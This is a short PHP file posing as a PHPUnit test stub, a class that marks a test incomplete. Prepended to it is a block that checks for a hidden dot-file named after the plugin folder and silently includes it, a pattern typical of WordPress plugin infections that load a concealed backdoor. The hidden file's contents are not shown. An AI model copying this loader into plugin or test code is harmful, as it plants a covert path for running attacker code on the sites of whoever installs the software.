<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class TestIncomplete extends PHPUnit_Framework_TestCase
{
    protected function runTest()
    {
        $this->markTestIncomplete('Incomplete test');
    }
}
